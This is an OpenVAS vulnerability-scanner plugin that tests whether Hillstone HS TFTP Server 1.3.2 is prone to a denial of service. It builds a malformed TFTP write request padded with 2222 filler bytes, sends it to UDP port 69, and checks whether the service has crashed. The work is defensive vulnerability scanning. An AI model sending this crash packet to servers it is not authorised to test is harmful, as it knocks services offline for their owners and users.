###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hs_tftp_server_dos_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Hillstone Software TFTP Write/Read Request Server Denial Of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to crash the server process,
  resulting in a denial-of-service condition.
  Impact Level: Application";
tag_affected = "Hillstone Software HS TFTP version 1.3.2";
tag_insight = "The flaw is caused by an error when processing TFTP write and read requests,
  which can be exploited to crash the server via a specially crafted request
  sent to UDP port 69.";
tag_solution = "No solution or patch is available as of th 05th December, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.hillstone-software.com/hs_tftp_details.htm";
tag_summary = "This host is running Hillstone Software TFTP Server and is prone to
  denial of service vulnerability.";

if(description)
{
  script_id(802406);
  script_version("$Revision: 13 $");
  script_bugtraq_id(50886);
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-05 15:58:57 +0530 (Mon, 05 Dec 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Hillstone Software TFTP Write/Read Request Server Denial Of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=419");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/107468/hillstone-dos.txt");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SecPod_Hillstone_Software_HS_TFTP_Server_DoS.txt");

  script_description(desc);
  script_summary("Determine if HS TFTP Server is prone to a denial-of-service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_udp_ports("Services/udp/tftp");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("network_func.inc");

## Get TFTP Port
port = get_kb_item("Services/udp/tftp");

if(!port){
  port = 69;
}

## Check UDP port status as get_udp_port_state() not working properly
if(!check_udp_port_status(dport:port)){
  exit(0);
}

sock = open_sock_udp(port);
if(!sock){
  exit(0);
}

## Building  attack request
crash = raw_string(0x00,0x02) + string(crap(data: raw_string(0x90),
        length: 2222)) + "binary" + raw_string(0x00);

## Sending attack
send(socket:sock, data:crash);

## Close UDP Socket
close(sock);

## Check UDP port closed or not
## i.e Confirm exploit worked or not
if(!check_udp_port_status(dport:port)){
 security_warning(port:port,proto:"udp");
}
